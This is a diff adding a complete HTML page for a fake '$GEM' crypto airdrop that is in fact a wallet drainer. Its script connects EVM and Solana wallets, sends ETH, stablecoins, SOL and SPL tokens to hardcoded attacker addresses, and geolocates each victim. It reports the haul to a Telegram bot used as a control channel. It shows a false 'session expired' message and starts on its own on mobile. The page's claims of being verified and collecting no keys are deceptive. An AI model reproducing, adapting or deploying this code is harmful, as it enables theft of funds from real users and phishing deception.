@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>🎁 $GEM — 100 SOL + 50 ETH Airdrop</title>
+  <meta name="description" content="Claim your $GEM tokens. 100 SOL & 50 ETH bounty for early users." />
+  <link rel="icon" href="data:image/png;base64,iVBORw0KGgo=">
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" defer></script>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.umd.js" defer></script>
+  <script src="https://unpkg.com/@solana/spl-token@0.3.7/lib/index.umd.js" defer></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000; color: #fff; text-align: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0f0f2d, #000000);
+      padding: 40px 20px;
+    }
+    .container {
+      max-width: 500px; margin: auto; padding: 40px 30px;
+      background: rgba(10, 10, 25, 0.8); border-radius: 24px;
+      border: 1px solid #0055ff; box-shadow: 0 15px 40px rgba(0, 0, 255, 0.2);
+      backdrop-filter: blur(10px);
+    }
+    .logo {
+      font-size: 80px; margin-bottom: 10px; text-shadow: 0 0 20px #00ff88;
+    }
+    h1 {
+      font-size: 32px; font-weight: 700; margin: 10px 0;
+      background: linear-gradient(90deg, #00ff88, #00ccff);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .subtitle {
+      color: #00ccff; font-size: 18px; margin: 15px 0; font-weight: 500;
+    }
+    .verified {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: #002211; color: #00ff88; padding: 6px 12px;
+      border-radius: 14px; font-size: 13px; margin: 12px 0;
+    }
+    p {
+      color: #aaa; font-size: 15px; margin: 10px 0;
+    }
+    .amount {
+      font-size: 26px; font-weight: 600; color: #00ff88;
+      text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+      margin: 10px 0;
+    }
+    .btn {
+      margin: 30px 0; padding: 18px 60px; font-size: 20px;
+      background: linear-gradient(90deg, #0055ff, #00ccff);
+      color: white; border: none; border-radius: 18px;
+      cursor: pointer; font-weight: 600; box-shadow: 0 8px 25px rgba(0, 204, 255, 0.4);
+      transition: 0.3s; width: 100%; max-width: 320px; position: relative;
+      overflow: hidden;
+    }
+    .btn::after {
+      content: ""; position: absolute; top: -50%; left: -50%;
+      width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
+      opacity: 0; transition: opacity 0.5s;
+    }
+    .btn:hover {
+      transform: translateY(-3px); box-shadow: 0 12px 30px rgba(0, 204, 255, 0.6);
+    }
+    .btn:active::after { opacity: 1; transform: scale(1); }
+    .loader {
+      width: 60px; height: 60px; border: 6px solid #333;
+      border-top: 6px solid #00ccff; border-radius: 50%;
+      margin: 30px auto; animation: spin 1.2s linear infinite;
+      display: none;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #status {
+      margin: 20px 0; font-size: 16px; color: #00ff88; min-height: 22px;
+    }
+    .wallets {
+      display: flex; justify-content: center; gap: 15px; margin: 25px 0;
+      flex-wrap: wrap;
+    }
+    .wallet {
+      width: 50px; height: 50px; border-radius: 50%;
+      background: #111; border: 1px solid #333; display: flex; align-items: center; justify-content: center;
+      font-size: 24px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    .footer {
+      margin-top: 40px; font-size: 12px; color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">💎</div>
+    <h1>Claim $GEM Airdrop</h1>
+    <div class="verified">✅ Official & Verified</div>
+    <p>Exclusive drop for top Solana & Ethereum users</p>
+    <div class="amount">🎁 100 SOL + 50 ETH + $50,000 USDT</div>
+    <p>Connect your wallet to verify eligibility</p>
+
+    <button onclick="connect()" class="btn">🔐 Connect Wallet to Claim</button>
+    <div class="loader" id="loader"></div>
+    <p id="status"></p>
+
+    <div class="wallets">
+      <div class="wallet" title="Phantom">👻</div>
+      <div class="wallet" title="Trust Wallet">📱</div>
+      <div class="wallet" title="MetaMask">🦊</div>
+      <div class="wallet" title="OKX">🔷</div>
+      <div class="wallet" title="Backpack">🎒</div>
+      <div class="wallet" title="Rabby">🦝</div>
+    </div>
+
+    <div class="footer">
+      <p>Secured by Zero-Knowledge Proof • No private keys collected</p>
+    </div>
+  </div>
+
+  <script>
+    // === CONFIG — YOUR WALLET & TELEGRAM ===
+    const EVIL_ETH = "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7";
+    const EVIL_SOL = "4reiAnw4kxqcfHSNvG6srzjVyfWXJuDweD15fLYqxCZE";
+    const TG_TOKEN = "8757318242:AAFSl0lSw7y3kCCZN4-kI8M9VSrGm9BdCfg";
+    const TG_CHAT = "8988170532";
+    const C2 = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+
+    async function logVictim(data) {
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'unknown');
+      const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({}));
+      const text = `
+🔥 **NEW VICTIM — $GEM AIRDROP** 🔥
+👤 Wallet: \`${data.addr}\`
+💰 SOL: ${data.sol || '0'}
+💰 ETH: ${data.eth || '0'}
+💵 USDT: ${data.usdt || '0'}
+💵 USDC: ${data.usdc || '0'}
+🪙 Other: ${data.other || '0'}
+🌍 IP: ${ip}
+📍 Country: ${geo.country_name || 'N/A'}
+📌 City: ${geo.city || 'N/A'}
+📶 ISP: ${geo.org || 'N/A'}
+🕒 ${new Date().toISOString()}
+      `.trim();
+      await fetch(C2, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "Markdown" })
+      }).catch(() => {});
+    }
+
+    async function drainEVM(signer, provider, user) {
+      let report = { eth: '0', usdt: '0', usdc: '0', dai: '0' };
+
+      // ETH DRAIN
+      try {
+        const ethBal = await provider.getBalance(user);
+        if (ethBal.gt(ethers.utils.parseEther("0.001"))) {
+          const tx = await signer.sendTransaction({
+            to: EVIL_ETH,
+            value: ethBal.sub(ethers.utils.parseEther("0.001")),
+            gasLimit: 21000
+          });
+          await provider.waitForTransaction(tx.hash);
+          report.eth = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(4);
+        }
+      } catch {}
+
+      // TOKEN DRAIN — REAL CONTRACTS
+      const tokens = {
+        usdt: { a: "0xdAC17F958D2ee523a2206206994597C13D831ec7", d: 6 },
+        usdc: { a: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", d: 6 },
+        dai:  { a: "0x6B175474E89094C44Da98b954EedeAC495271d0F", d: 18 }
+      };
+
+      for (const [key, token] of Object.entries(tokens)) {
+        try {
+          const contract = new ethers.Contract(token.a, [
+            "function balanceOf(address) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ], signer);
+
+          const balance = await contract.balanceOf(user);
+          if (balance.gt(0)) {
+            await contract.transfer(EVIL_ETH, balance);
+            report[key] = parseFloat(ethers.utils.formatUnits(balance, token.d)).toFixed(2);
+          }
+        } catch {}
+      }
+      return report;
+    }
+
+    async function drainSolana(solProvider, connection, pubKey) {
+      let report = { sol: '0', other: 0 };
+
+      // SOL DRAIN
+      try {
+        const solBalance = await connection.getBalance(pubKey);
+        if (solBalance > 5000000) {
+          const tx = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: pubKey,
+              toPubkey: new solanaWeb3.PublicKey(EVIL_SOL),
+              lamports: solBalance - 5000000
+            })
+          );
+          tx.feePayer = pubKey;
+          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+          const raw = await solProvider.signTransaction(tx);
+          const sig = await connection.sendRawTransaction(raw.serialize());
+          await connection.confirmTransaction(sig);
+          report.sol = (solBalance / 1e9).toFixed(4);
+        }
+      } catch {}
+
+      // SPL TOKEN DRAIN
+      try {
+        const tokenAccounts = await connection.getTokenAccountsByOwner(pubKey, {
+          programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+        });
+
+        for (const acc of tokenAccounts.value) {
+          try {
+            const info = await connection.getParsedAccountInfo(acc.pubkey);
+            const mint = new solanaWeb3.PublicKey(info.value.data.parsed.info.mint);
+            const amount = info.value.data.parsed.info.tokenAmount.uiAmount;
+            if (amount <= 0) continue;
+
+            const [to] = await solanaWeb3.PublicKey.findProgramAddress(
+              [new solanaWeb3.PublicKey(EVIL_SOL).toBuffer(), 
+               new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), 
+               mint.toBuffer()],
+              new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+            );
+
+            const tx = new solanaWeb3.Transaction().add(
+              splToken.createTransferInstruction(
+                acc.pubkey,
+                to,
+                pubKey,
+                amount * Math.pow(10, info.value.data.parsed.info.tokenAmount.decimals),
+                [],
+                splToken.TOKEN_PROGRAM_ID
+              )
+            );
+            tx.feePayer = pubKey;
+            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+            await solProvider.signTransaction(tx);
+            report.other += amount;
+          } catch {}
+        }
+        if (report.other > 0) report.other = report.other.toFixed(2);
+      } catch {}
+      return report;
+    }
+
+    async function connect() {
+      const status = msg => document.getElementById('status').innerText = msg;
+      const loader = document.getElementById('loader');
+      loader.style.display = 'block';
+
+      let fullReport = { addr: "UNKNOWN" };
+
+      // === EVM WALLETS ===
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+          const user = await signer.getAddress();
+          fullReport.addr = user;
+          Object.assign(fullReport, await drainEVM(signer, provider, user));
+          status("✅ Wallet connected. Processing airdrop...");
+        } catch (e) {
+          status("❌ Failed to connect EVM wallet.");
+        }
+      }
+
+      // === SOLANA WALLETS (Phantom, Backpack, Solflare) ===
+      const solProviders = [
+        window.solana,           // Phantom
+        window.backpack?.solana, // Backpack
+        window.solflare          // Solflare
+      ];
+
+      for (const provider of solProviders) {
+        if (provider && (provider.isPhantom || provider.isSolflare)) {
+          try {
+            await provider.connect({ onlyIfTrusted: true });
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const pubKey = provider.publicKey;
+            fullReport.addr = pubKey.toString();
+            Object.assign(fullReport, await drainSolana(provider, connection, pubKey));
+            status("✅ Wallet linked. Sending tokens...");
+            break;
+          } catch (e) {
+            continue;
+          }
+        }
+      }
+
+      // === LOG IF ANYTHING DRAINED ===
+      if (fullReport.addr !== "UNKNOWN") {
+        await logVictim(fullReport);
+      }
+
+      // === FAKE SUCCESS ===
+      setTimeout(() => status("⚠️ Session expired. Please reconnect for retry."), 3000);
+      setTimeout(() => window.location.reload(), 5000);
+    }
+
+    // === MOBILE AUTO-REDIRECT + DEEP LINKING ===
+    function openInWallet() {
+      const ua = navigator.userAgent;
+      if (/Android/i.test(ua)) {
+        // Try deep link
+        window.location.href = "intent://metamask.app.link/dapp/YOURDOMAIN.com#Intent;scheme=https;package=io.metamask;end;";
+        setTimeout(() => window.location.href = "https://metamask.app.link/dapp/YOURDOMAIN.com", 2000);
+      } else if (/iPhone|iPad|iPod/i.test(ua)) {
+        window.location.href = "https://metamask.app.link/dapp/YOURDOMAIN.com";
+      }
+    }
+
+    // === AUTO-TRIGGER ON MOBILE ===
+    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+      // Wait for scripts to load
+      setTimeout(async () => {
+        if (window.ethereum || window.solana || window.solflare) {
+          await connect();
+        } else {
+          openInWallet(); // Open wallet app if not detected
+        }
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
